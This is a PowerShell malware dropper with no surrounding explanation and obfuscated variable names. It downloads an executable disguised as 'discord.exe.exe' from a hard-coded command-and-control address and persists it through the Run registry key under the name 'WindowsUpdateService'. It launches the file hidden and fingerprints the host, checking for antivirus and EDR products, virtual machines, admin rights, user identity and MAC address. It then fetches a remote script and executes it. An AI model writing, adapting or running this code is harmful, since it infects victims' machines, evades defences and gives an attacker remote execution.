$c2_ip = "http://10.45.1.2:32030"
$exec_name = "discord.exe.exe"
$full_exec_path = "$env:TEMP\$exec_name"
function get_from_uri {
    param([string]$_uri)
    $_wc = New-Object Net.WebClient
    $_wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    return $_wc.DownloadString($_uri)
}
$local_config = @{
    pkg    = "/packages/$exec_name"
    update = "/sajdlæfdjjkælfd.ps1"
    hb     = "/api/heartbeat"
    cfg    = "/config.json"
}
$web_client = New-Object System.Net.WebClient
$web_client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$web_client.Headers.Add("X-Request-ID", [guid]::NewGuid().ToString())
$web_client.DownloadFile("$c2_ip$($local_config.pkg)", $full_exec_path)
$_uYg3X1CnzM = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $_uYg3X1CnzM -Name "WindowsUpdateService" -Value $full_exec_path
Start-Process -FilePath $full_exec_path -WindowStyle Hidden
$_Bv4tJcFg8L = (Get-Process -ErrorAction SilentlyContinue).ProcessName
$_Xn2rLdWk0S = @("MsMpEng","avgnt","avp","bdagent","ekrn","SavService","ccSvcHst","CylanceSvc","SentinelAgent","CSFalconService")
$_Qk7wNmHp3R = @()
foreach ($_av in $_Xn2rLdWk0S) {
    if ($_Bv4tJcFg8L -contains $_av) { $_Qk7wNmHp3R += $_av }
}
$_Gd6sNwBh1J = @()
try {
    $_Gd6sNwBh1J = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue |
        Select-Object -ExpandProperty displayName
} catch {}
$_Yb3tLxCv8D = (Get-WmiObject Win32_ComputerSystem)
$_Wn5gHjRk0F = $_Yb3tLxCv8D.Model -match "Virtual|VMware|VirtualBox|Hyper-V|QEMU|Xen"
$_Hp9kTfVm4X = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$_Np3kWcFm8R = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress } | Select-Object -First 1).MACAddress
$_Rf4kMwXn7B = @{
    a = $_Qk7wNmHp3R -join ","
    p = $_Gd6sNwBh1J -join ","
    v = [int]$_Wn5gHjRk0F
    e = [int]$_Hp9kTfVm4X
    d = [int]($env:USERDOMAIN -ne $env:COMPUTERNAME)
    r = $env:PROCESSOR_ARCHITECTURE
    u = "$env:USERDOMAIN\$env:USERNAME"
    m = $_Np3kWcFm8R
    t = [System.Environment]::TickCount
} | ConvertTo-Json -Compress
$_Jn4tLcXw8B = "$env:TEMP\~df$(Get-Date -Format 'yyyyMMddHHmm').tmp"
[IO.File]::WriteAllText($_Jn4tLcXw8B, $_Rf4kMwXn7B)
Invoke-Expression (get_from_uri "$c2_ip$($local_config.update)")
$_Rw9vKm3HpQ = Get-Process | Where-Object { $_.ProcessName -eq "update_service" }
if ($_Rw9vKm3HpQ) {
    $_Rw9vKm3HpQ.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
}
$_Vp7mFgDr2Y = New-Object System.Threading.Mutex($false, "Global\WinUpdateSvc_MTX")
if (-not $_Vp7mFgDr2Y.WaitOne(0)) { exit }